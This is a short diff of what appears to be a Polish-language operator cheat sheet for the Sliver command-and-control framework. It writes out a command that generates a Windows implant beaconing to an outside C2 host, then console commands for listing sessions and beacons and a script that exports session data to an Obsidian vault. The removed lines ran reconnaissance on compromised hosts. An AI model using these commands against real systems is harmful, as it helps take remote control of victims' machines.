@@ -50,11 +50,15 @@ sliver
 # Generowanie payloadu
 generate --http https://c2.maskencrypt.eu --os windows --save payload.exe
 
-# Sprawdzenie sesji
+# Lista sesji / beaconów (w konsoli)
 sessions
-use <ID>
-whoami
-screenshot
+beacons
+jobs
+
+# Zapis do Obsidian — NIE MA `sessions --save`
+# ( --save jest tylko przy generate )
+/root/obsidian-vault/Narzedzia/export_sliver_to_obsidian.sh
+# → Projekty/Infrastruktura_C2/sessions.md
 
 # status hosta
 sliver-status
